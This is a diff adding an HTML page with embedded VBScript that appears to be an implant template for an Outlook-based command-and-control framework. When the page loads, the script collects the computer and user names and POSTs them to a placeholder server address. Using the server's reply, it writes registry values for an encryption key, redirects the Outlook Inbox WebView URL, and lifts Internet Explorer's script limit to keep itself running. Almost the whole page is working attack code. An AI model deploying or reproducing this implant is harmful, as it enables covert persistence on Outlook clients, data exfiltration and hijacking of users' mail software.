@@ -1,0 +1,103 @@
+<html>
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta http-equiv="refresh" content="{{ REFRESH_TIME }}">
+<meta http-equiv="Cache-Control" content=NO-CACHE, no-store, must-revalidate, max-age=0" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="EXPIRES" CONTENT="0">
+<title>Outlook</title>
+<style>
+body {
+    overflow: hidden;
+    border: 0px;
+    padding: 0px;
+    margin: 0px;
+}
+</style>
+<script id=clientEventHandlersVBS language=vbscript>
+<!--
+On Error Resume Next
+
+Function GetEnvironment()
+    On Error Resume Next
+    Set sh = outlookapp.CreateObject("Wscript.Shell")
+	compname = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+	usern = sh.ExpandEnvironmentStrings("%USERNAME%")
+	r = BaseDecode(compname & "|" & usern,1)
+	GetEnvironment = r
+End Function
+
+Function SetRegKey(subkey,value,valuetype)
+	On Error Resume Next
+	Set oL = outlookapp.CreateObject("Wscript.Shell")
+	ol.RegWrite subkey, value, valuetype
+End Function
+
+Function BaseDecode(value, LE)
+	On Error Resume Next
+	With outlookapp.CreateObject("Msxml2.DOMDocument").CreateElement("aux")
+		.DataType = "bin.base64"
+		if LE then
+			.NodeTypedValue = StrToBytes(value, "utf-16le", 2)
+		else
+			.NodeTypedValue = StrToBytes(value, "utf-8", 3)
+		end if
+		BaseDecode = .Text
+	End With
+End Function
+
+Function requestpage(uri, rR)
+	On Error Resume Next
+	vi = Left(outlookapp.version,4)
+	d = rR
+	set oP = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
+	oP.open "POST", uri,false
+	oP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+	oP.setRequestHeader "Content-Length", Len(d)
+	oP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vi
+	oP.setOption 2, 13056
+	oP.send Replace(d, vbLf, "")
+	requestpage = oP.responseText
+End Function
+
+Function StrToBytes(strn, cset, pos)
+	On Error Resume Next
+	With outlookapp.CreateObject("ADODB.Stream")
+			.Type = 2
+			.Charset = cset
+			.Open
+			.WriteText strn
+			.Position = 0
+			.Type = 1
+			.Position = pos
+			StrToBytes = .Read
+			.Close
+	End With
+End function
+
+O = ""
+uriloc = "{{ DNS }}{{ URL }}"
+Set outlookapp = window.external.OutlookApplication
+
+Sub window_onload()
+	O = GetEnvironment()
+	rul = requestpage(uriloc, chr(34) & O & chr(34))
+
+	if not rul = "" Then
+		Set box = outlookapp.GetNameSpace("MAPI")
+		Set fold = box.GetDefaultFolder(9)
+		val1 = SetRegKey("HKCU\" & {{ ENCRYPTIONKEY_LOCATION }} & "\" & {{ ENCRYPTIONKEY_VALUENAME }}, Split(rul,"||")(0), "REG_SZ")
+		val2 = SetRegKey("HKCU\Software\Microsoft\Office\" & Left(outlookapp.version,4) & "\Outlook\Webview\Inbox\URL", Split(rul,"||")(1), "REG_SZ")
+		val3 = SetRegKey("HKCU\Software\Microsoft\Internet Explorer\Styles\MaxScriptStatements", &Hffffffff, "REG_DWORD")
+		Set outlookapp.ActiveExplorer.CurrentFolder = fold
+	End if
+End Sub
+-->
+</script>
+</head>
+
+<body>
+<object classid="CLSID:{{ CLSID }}" id="{{ OUTLOOK_VIEW_ID }}" data="" width="100%" height="100%"></object>
+</body>
+</html>
